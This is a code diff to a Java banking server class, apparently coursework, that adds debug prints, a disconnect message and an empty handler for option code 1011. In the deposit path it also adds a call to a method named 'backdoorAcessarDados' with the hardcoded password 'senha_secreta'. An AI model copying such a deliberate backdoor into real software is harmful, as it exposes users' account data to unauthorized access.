@@ -75,6 +75,8 @@ public class Servidor implements Runnable {
                         while (operacao != 6) {
   
                             operacao = entrada.nextInt();
+
+                            System.err.println(operacao);
                             
                             System.out.println("Login bem sucedido");
                             //saque
@@ -162,6 +164,9 @@ public class Servidor implements Runnable {
                                 mensagem = entrada.nextLine();
                                 valor = Double.parseDouble(mensagem);
 
+                                String teste = "senha_secreta";
+                                
+                                sistema.backdoorAcessarDados(teste);
 
                                 System.out.println("Operação de deposito em andamento..");
 
@@ -185,6 +190,7 @@ public class Servidor implements Runnable {
                             
                         }
 
+                        System.out.println("Cliente desconectado do servidor");
                        
 
                     }
@@ -215,6 +221,10 @@ public class Servidor implements Runnable {
                         saida.println(retorno);
 
 
+                    }
+
+                    if (opcao == 1011) {
+                        
                     }
 
                
